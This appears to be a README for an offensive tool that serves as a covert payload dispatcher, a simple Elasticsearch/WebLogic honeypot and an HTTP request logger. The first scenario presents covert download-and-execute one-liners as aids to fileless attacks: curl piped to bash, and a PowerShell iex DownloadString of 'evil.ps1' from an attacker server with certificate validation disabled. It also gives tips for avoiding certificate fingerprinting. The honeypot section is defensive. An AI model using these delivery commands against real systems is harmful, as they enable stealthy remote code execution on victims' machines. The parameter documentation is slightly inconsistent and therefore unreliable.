# Fisher

Fisher is a dispatcher、honeypot and http-request logger.

隐蔽的下发程序、蜜罐、http请求记录。

## 参数

```
python3 fisher.py -p [port] {-s} {-Z 0/1}

		-h / --help : show help message
		-p / --port : set server port to listen on
		-s / --tls : https support
		-z / --honeypot : 
		                 '1' for elasticsearch
						 '2' for weblogic
```

## 场景

### 场景1 样本下发

**step1:** 根目录手工生成证书。默认证书用的多了会被标记特征，强烈建议自己手动生成一个。

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

**step2:** 将待下发文件放置在data目录中。拉起程序后会自动放置于随机目录中。

**step3:** 运行以下命令。

```shell
python3 fisher.py -p 56221 -s
```

![2022-07-09_135007](https://github.com/aplyc1a/fisher/blob/master/2022-07-09_135007.png)

**step4**：如上图所示，客户端可以使用如下方法隐蔽的下载程序，可用于辅助实施无文件攻击。

```shell
# Linux
'''
curl https://SERVER_IP:8443/JHB0IwokE5Y7nDUqOdaxur8Mi31Q9g/bash/1.sh -k -s|bash
wget https://SERVER_IP:8443/JHB0IwokE5Y7nDUqOdaxur8Mi31Q9g/bash/1.sh --no-check-certificate
'''

# Windows
'''
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
iex(New-Object Net.WebClient).DownloadString('https://SERVER_IP:8443/asdW323dj293S02eaj302dj02d932/evil.ps1')

(New-Object Net.WebClient).DownloadFile('https://SERVER_IP:8443/asdW323dj293S02eaj302dj02d932/1.zip','c:\1.zip')
'''
```

### 场景2 蜜罐

简单模拟elasticsearch、weblogic两种服务。

**step1:** 如需https支持，需要手动生成证书

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

**step2:** 运行以下命令。

```shell
#elasticsearch
python3 fisher.py -p 56221 -s -Z 0

#weblogic
python3 fisher.py -p 56221 -s -Z 1
```

**step3:**标红的\[H]记录表示蜜罐相关事件，相关细节也完整的存储在log目录下，甚至包含POST数据。

![2022-07-09_134711](https://github.com/aplyc1a/fisher/blob/master/2022-07-09_134711.png)
